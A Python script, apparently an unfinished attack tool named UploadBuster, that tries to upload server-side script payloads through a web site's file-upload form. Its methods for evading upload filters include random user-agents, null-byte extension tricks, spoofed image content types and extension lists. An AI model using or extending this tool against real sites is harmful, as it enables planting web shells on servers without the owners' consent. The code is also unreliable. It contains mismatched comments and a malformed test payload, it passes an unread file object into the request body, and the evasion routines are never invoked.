from random import randint
import requests
import json
import argparse

parser = argparse.ArgumentParser()

#-db DATABSE -u USERNAME -p PASSWORD -size 20
parser.add_argument("-u", "--url", help="Full url to the upload page i.e /upload.php")
parser.add_argument("-a", "--all-tests", help="Make the full test of insecure file upload on target")
parser.add_argument("-p", "--payload", help="Payload to sent, default: the preferred language hello script")
parser.add_argument("-b", "--backend", help="The backend language of the website [php,jsp,asp]")
parser.add_argument("-e", "--extensions", help="The allowed extensions of the website [jpeg,docx,png,pdf]")
parser.add_argument("-s", "--success", help='The success message of the upload script. `Upload was successful! link: site.com/payload.php`')
args = parser.parse_args()

class UploadBuster:

    def __init__(self):
        # import configuration
        with open('json.json') as file:
            self._configuration = json.load(file)

        self.target_url = args.url
        self.payload_file_name = args.payload
        self.backend_tech = args.backend
        self.allowed_ext = args.extensions
        self.success_message = None
        self._content_type = None
        self._user_agent = None
        self.payload = None
        self._headers = dict()
        self.temp_file_name_bank = []
        self.temp_content_type_bank = []
        self._test_payload = '<php ?>'
        self.auth = {}

    # techs

    def _rand_user_agent(self):
        self._user_agent = {"user-agent": self._configuration['config']['user-agents'][randint(0,2)]}
        self._headers.update(self._user_agent)

    def _tech_raw(self):
        for allowed_ext in self.allowed_ext:
            for ext in self._configuration['exts'][allowed_ext]:
                temp_file_name = self.payload_file_name + ext
                self.temp_file_name_bank.append(temp_file_name)

    def _tech_null(self):
        for ext in self._configuration['exts']['null']:
            temp_file_name = self.payload_file_name + ext
            self.temp_file_name_bank.append(temp_file_name)

    def _tech_content_type(self):
        for content_type in self._configuration['content_types']:
            self.temp_content_type_bank = content_type

    # back

    def _payload_builder(self):
        return f'''
Content-Disposition: form-data; name="encoded_image"; filename="{self.payload_file_name}"
Content-Type: image/jpeg

{self.payload_data}
'''

    def _send_post_request(self):
        with open(self.payload_file_name, 'rb') as self.payload_data:
            return requests.post(self.target_url, headers=self._headers, data=self._payload_builder(), timeout=3)

    def test_request(self):
        with open(self.payload_file_name, 'rb') as payload:
            req = requests.Request('POST', self.target_url, headers={'content-Type': 'application/x-php'},data=payload).prepare()

            print(f'''{req.method}\t{req.url}\n''',
                  req.headers.items()._mapping,
                  f'''\n\n{req.body}''')

    def main(self):
        self._rand_user_agent()
        self._send_post_request()


if __name__ == '__main__':
    UploadBuster().main()
